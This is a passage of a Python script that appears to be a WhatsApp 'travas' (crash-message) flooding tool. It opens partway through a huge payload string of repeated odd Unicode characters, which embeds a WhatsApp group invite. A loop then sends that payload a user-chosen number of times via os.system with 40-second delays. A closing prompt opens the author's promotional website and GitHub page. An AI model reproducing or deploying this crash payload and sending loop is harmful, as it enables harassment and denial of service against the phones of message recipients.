ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ. https://chat.whatsapp.com/GUIVzxfdIS20aOzrJX1CG2 ~_*☞ৡୡ☕LAB_731ೋlaboratorioৡী✆oficial⚛.travas.net⑥⑥⑥.whatsapp.comೋ☕ୡৡ☜*_~
~_*💯♨✅ⓐⓝⓓⓡⓞⓘⓓ✍*_~*
""")
	for i in range (crash):
		print()
		print(f"{Y}[✓] Sending Now\n")
		print(f"{G}[{Y}+{G}]{M}Applying 40sec delay...")
		link1 = os.system(link)
		time.sleep(40)
		if link1 == 0:
			print(f"{G} Successful")
			pass
		else:
			print(f"{R}[×] Failed  ")
		time.sleep(0.2)
	return main()

def MSG():
	print(Y)
	YTC = input("Have U Join Us ? (Y/N): ")
	if YTC == 'Y' or YTC == 'y':
		print(G)
		print("Thank You For Joining Us...\n")
		time.sleep(4)
		print("Initializing tool...")
		time.sleep(4)		
		print(W + "\n\n")
		main()
	elif YTC == 'N' or YTC == 'n':
		print("")
		os.system("xdg-open https://bonitominati.in.net/")
		time.sleep(8)
		os.system("xdg-open https://github.com/BonitoMinati")
		time.sleep(3)
		print(W + "\n\n")
		main()
MSG()
